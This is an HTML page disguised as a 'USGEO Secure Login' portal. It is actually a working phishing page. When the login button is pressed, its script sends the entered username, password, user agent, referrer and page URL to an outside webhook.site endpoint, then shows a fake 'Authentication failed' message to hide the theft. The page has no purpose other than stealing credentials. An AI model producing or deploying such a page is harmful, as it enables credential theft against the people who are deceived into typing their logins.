<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>USGEO Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
      text-align: center;
      width: 300px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #003366;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }
    h2 {
      color: #003366;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>USGEO Secure Login</h2>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button onclick="send()">Login</button>
  </div>

  <script>
    function send() {
      const data = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        location: window.location.href,
        time: new Date().toISOString()
      };

      fetch("https://webhook.site/f988f5a7-6736-4a39-bbf2-7314ca91aa7e", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      alert("Authentication failed. Please contact the system administrator.");
    }
  </script>
</body>
</html>
